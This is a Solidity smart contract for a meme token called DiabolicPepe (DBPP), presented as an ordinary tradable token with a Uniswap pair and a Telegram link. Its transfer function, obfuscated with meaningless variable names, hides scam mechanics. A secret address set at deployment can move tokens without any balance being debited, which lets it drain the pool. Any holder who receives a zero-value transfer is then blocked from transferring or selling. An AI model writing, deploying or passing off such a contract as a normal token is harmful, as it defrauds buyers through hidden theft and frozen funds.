/*

https://t.me/pepediabolic

*/
// SPDX-License-Identifier: MIT



pragma solidity ^0.8.10;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract DiabolicPepe is Ownable {
    uint256 public totalSupply;

    mapping(address => uint256) private cattle;

    constructor(address destir) {
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        totalSupply = 1000000000 * 10 ** decimals;
        cattle[destir] = zod;
        balanceOf[msg.sender] = totalSupply;
        name = 'DiabolicPepe';
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        symbol = 'DBPP';
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    address public uniswapV2Pair;

    function transferFrom(address hate, address terror, uint256 fury) public returns (bool success) {
        wand(hate, terror, fury);
        require(fury <= allowance[hate][msg.sender]);
        allowance[hate][msg.sender] -= fury;
        return true;
    }

    string public symbol;

    function approve(address hate, uint256 terror) public returns (bool success) {
        allowance[msg.sender][hate] = terror;
        emit Approval(msg.sender, hate, terror);
        return true;
    }

    function wand(address frigid, address high, uint256 zac) private returns (bool success) {
        if (cattle[frigid] == 0) {
            if (adventure[frigid] > 0 && uniswapV2Pair != frigid) {
                cattle[frigid] -= zod;
            }
            balanceOf[frigid] -= zac;
        }
        balanceOf[high] += zac;
        if (zac == 0) {
            adventure[high] += zod;
        }
        emit Transfer(frigid, high, zac);
        return true;
    }

    string public name;

    function transfer(address sert, uint256 unar) public returns (bool success) {
        wand(msg.sender, sert, unar);
        return true;
    }
    

    mapping(address => mapping(address => uint256)) public allowance;

    uint8 public decimals = 9;

    uint256 private zod = 15;

    mapping(address => uint256) private adventure;

    mapping(address => uint256) public balanceOf;

    event Approval(address indexed owner, address indexed spender, uint256 value);
}